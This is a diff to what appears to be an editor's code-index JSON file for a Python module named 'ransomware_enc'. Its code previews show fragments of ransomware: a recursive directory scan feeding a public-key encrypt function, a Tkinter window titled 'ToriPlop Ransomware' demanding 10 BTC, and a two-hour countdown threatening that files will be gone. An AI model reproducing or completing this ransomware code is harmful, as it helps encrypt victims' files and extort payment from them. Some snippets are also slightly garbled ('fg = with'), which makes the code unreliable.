@@ -116,7 +116,7 @@
         "kind": 2,
         "importPath": "ransomware_enc",
         "description": "ransomware_enc",
-        "peekOfCode": "def countdown(count):\n    # Create Ransomware window\n    hour, minute, second = count.split(':')\n    hour = int(hour)\n    minute = int(minute)\n    second = int(second)\n    label['text' = ''",
+        "peekOfCode": "def countdown(count):\n    # Create Ransomware window\n    hour, minute, second = count.split(':')\n    hour = int(hour)\n    minute = int(minute)\n    second = int(second)\n    label['text'] = '{}:{}:{}'.format(hour, minute, second)\n    if second > 0:\n        second -=1\n    elif minute > 0:",
         "detail": "ransomware_enc",
         "documentation": {}
     },
@@ -135,6 +135,42 @@
         "importPath": "ransomware_enc",
         "description": "ransomware_enc",
         "peekOfCode": "pubKey = base64.b64encode(pubKey)\n# function for directory scan\ndef scanRecurse(baseDir):\n     for entry in os.scandir(baseDir):\n         if entry.is_file():\n             yield entry\n         else:\n             yield from scanRecurse(entry.path)\n# function for encryption\ndef encrypt(dataFile, publicKey):",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "root",
+        "kind": 5,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "root = tk.Tk()\nroot.title('ToriPlop Ransomware')\nroot.geometry('500x300')\nroot.resizable(False, False)\nlabel1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\\nto unlock them !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel1.pack()\nlabel = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')\nlabel.pack()\nlabel2 = tk.Label(root, text = '\\n\\n If the time runs out your file\\nwill be gone !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel2.pack()",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "label1",
+        "kind": 5,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "label1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\\nto unlock them !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel1.pack()\nlabel = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')\nlabel.pack()\nlabel2 = tk.Label(root, text = '\\n\\n If the time runs out your file\\nwill be gone !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel2.pack()\ncountdown('02:00:00')\nroot.mainloop()",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "label",
+        "kind": 5,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "label = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')\nlabel.pack()\nlabel2 = tk.Label(root, text = '\\n\\n If the time runs out your file\\nwill be gone !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel2.pack()\ncountdown('02:00:00')\nroot.mainloop()",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "label2",
+        "kind": 5,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "label2 = tk.Label(root, text = '\\n\\n If the time runs out your file\\nwill be gone !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel2.pack()\ncountdown('02:00:00')\nroot.mainloop()",
         "detail": "ransomware_enc",
         "documentation": {}
     }
